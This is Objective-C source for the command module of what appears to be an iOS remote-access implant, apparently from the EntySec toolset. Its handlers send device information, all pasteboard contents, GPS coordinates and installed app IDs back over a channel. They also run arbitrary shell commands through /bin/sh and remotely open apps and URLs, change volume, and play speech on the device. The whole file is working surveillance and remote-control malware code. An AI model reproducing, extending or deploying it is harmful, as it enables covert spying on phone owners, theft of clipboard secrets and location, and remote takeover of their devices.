/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "channel.h"
#import "ios_commands.h"

@implementation Commands

@synthesize fileManager;

NSString *process = @"%bold%blue[*]%end ";
NSString *success = @"%bold%green[+]%end ";
NSString *error = @"%bold%red[-]%end ";
NSString *warning = @"%bold%yellow[!]%end ";
NSString *information = @"%bold%white[i]%end ";

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];

    fileManager = [[NSFileManager alloc]  init];
    [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];

    return self;
}

-(void)cmd_sysinfo {
    UIDevice* device = [UIDevice currentDevice];
    int batinfo = ([_thisUIDevice batteryLevel] * 100);

    NSString *sysinfo = [NSString stringWithFormat:@"%@Model: %@\n%@Battery: %d\n%@Version: %@\n%@Name: %@\n",
                        information, [device model], information, batinfo, information, [device systemVersion], information, [device name]];

    send_channel(channel, [sysinfo UTF8String]);
}

-(void)cmd_getpid {
    NSProcessInfo* processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@PID: %d\n", information, processID]];
}

-(void)cmd_getpaste {
    UIPasteboard* pb = [UIPasteboard generalPasteboard];
    [channel sendChannel:channelPipe withData:@"Pasteboard:\n"];
    if ([pb.strings count] > 1) {
        NSUInteger count = 0;
        for (NSString* pstring in pb.strings){
            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%lu: %@\n", count, pstring]];
            count++;
        }
    } else if ([pb.strings count] == 1)
        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@\n",
                                                   [pb.strings firstObject]]];
}

-(void)cmd_battery {
    int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
    NSString *info = [NSString stringWithFormat:@"%@Battery level: %d (%@charging)\n", information,
                      batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @"not "];
    [channel sendChannel:channelPipe withData:info];
}

-(void)cmd_getvol {
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Volume level: %.2f\n", information,
                                               [AVAudioSession sharedInstance].outputVolume]];
}

-(void)cmd_locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation* location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];

    if ((int)(coordinate.latitude + coordinate.longitude) == 0)
        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Unable to get device location!\n", error]];
    else {
        NSString *location = [NSString stringWithFormat:@"%@Latitude: %f\n%@Longitude: %f\n%@Map: http://maps.google.com/maps?q=%f,%f\n",
                             information, coordinate.latitude, information, coordinate.longitude,
                              information, coordinate.latitude, coordinate.longitude];
        [channel sendChannel:channelPipe withData:location];
    }
}

-(void)cmd_vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
}

-(void)cmd_bundleids {
    char buffer[1024];
    NSString* result = @"";
    CFArrayRef array = SBSCopyApplicationDisplayIdentifiers(NO, NO);
    CFIndex pointer;
    for (pointer = 0; pointer < CFArrayGetCount(array); pointer++) {
        CFStringGetCString(CFArrayGetValueAtIndex(array, pointer), buffer, sizeof(buffer), kCFStringEncodingUTF8);
        result = [NSString stringWithFormat:@"%@%s\n", result, buffer];
    }
    [channel sendChannel:channelPipe withData:result];
}

-(void)cmd_exec:(NSString *)command {
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/bin/sh"];
    NSArray *arguments = [NSArray arrayWithObjects: @"-c", [NSString stringWithFormat:@"%@", command], nil];
    [task setArguments:arguments];
    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];
    NSFileHandle *file = [pipe fileHandleForReading];
    [task launch];
    NSData *data = [file readDataToEndOfFile];
    [channel sendChannel:channelPipe withData:[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]];
}

-(void)cmd_say:(NSString *)message {
    AVSpeechSynthesizer *synthesizer = [[AVSpeechSynthesizer alloc] init];
    AVSpeechUtterance* utterance = [AVSpeechUtterance speechUtteranceWithString:message];
    utterance.rate = 0.5;

    NSString *language = [[NSLocale currentLocale] localeIdentifier];
    NSDictionary *languageDic = [NSLocale componentsFromLocaleIdentifier:language];

    NSString *countryCode = [languageDic objectForKey:NSLocaleCountryCode];
    NSString *languageCode = [languageDic objectForKey:NSLocaleLanguageCode];
    NSString *languageForVoice = [[NSString stringWithFormat:@"%@-%@", [languageCode lowercaseString], countryCode] lowercaseString];

    utterance.voice = [AVSpeechSynthesisVoice voiceWithLanguage:languageForVoice];
    [synthesizer speakUtterance:utterance];
}

-(void)cmd_setvol:(NSString *)level {
    MPVolumeView *volumeView = [[MPVolumeView alloc] init];
    UISlider* volumeViewSlider = nil;
    for (UIView* view in [volumeView subviews]) {
        if ([view.class.description isEqualToString:@"MPVolumeSlider"]) {
            volumeViewSlider = (UISlider*)view;
            break;
        }
    }
    [volumeViewSlider setValue:[level floatValue] animated:NO];
    [volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
}

-(void)cmd_player:(NSString*)action {
    if ([action isEqualToString:@"play"]) {
        [[MPMusicPlayerController systemMusicPlayer] play];
    } else if ([action isEqualToString:@"pause"]) {
        [[MPMusicPlayerController systemMusicPlayer] pause];
    } else if ([action isEqualToString:@"next"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToNextItem];
    } else if ([action isEqualToString:@"prev"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToPreviousItem];
    } else if ([action isEqualToString:@"info"]) {
        float checkTime = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        [NSThread sleepForTimeInterval:0.1];
        float playbackTime = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        if (checkTime != playbackTime) {
            MPMediaItem *song = [[MPMusicPlayerController systemMusicPlayer] nowPlayingItem];
            NSString *title = [song valueForProperty:MPMediaItemPropertyTitle];
            NSString *album = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
            NSString *artist = [song valueForProperty:MPMediaItemPropertyArtist];
            NSString *result = [NSString stringWithFormat:@"%@Title: %@\n%@Album: %@\n%@Artist: %@\n%@Playback time: %f\n",
                                information, title, information, album, information, artist, information, playbackTime];
            [channel sendChannel:channelPipe withData:result];
        } else {
            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Not playing.\n", warning]];
        }
    }
}

-(void)cmd_openapp:(NSString*)bundleID {
    CFStringRef identifier = CFStringCreateWithCString(
    kCFAllocatorDefault, [bundleID UTF8String], kCFStringEncodingUTF8);
    assert(identifier != NULL);
    int status = SBSLaunchApplicationWithIdentifier(identifier, NO);
    if (status != 0) {
        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Failed to open application!\n", error]];
    }
    CFRelease(identifier);
    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Application has been launched!\n", success]];
}

-(void)cmd_openurl:(NSString *)url {
    CFURLRef status = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
    if (!status) {
       [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Invalid URL address given!\n", error]];
        return;
    } else {
        bool ret = SBSOpenSensitiveURLAndUnlock(status, 1);
        if (!ret) {
            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Failed to open URL!\n", error]];
            return;
        }
    }
    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@URL has been opened!\n", success]];
}

-(void)cmd_chdir:(NSString *)directory {
    NSString* path = NSHomeDirectory();
    if (![directory isEqual:@""]) {
        path = directory;
    }
    BOOL isdir = NO;
    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
        if (isdir)
            [fileManager changeCurrentDirectoryPath:path];
        else {
            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Path: %@: Not a directory!\n",
                                                      error, path]];
            return;
        }
    } else {
        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Path %@: No such file or directory!\n",
                                                  error, path]];
        return;
    }
    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Current directory: %@", information,
                                              [fileManager currentDirectoryPath]]];
}

@end
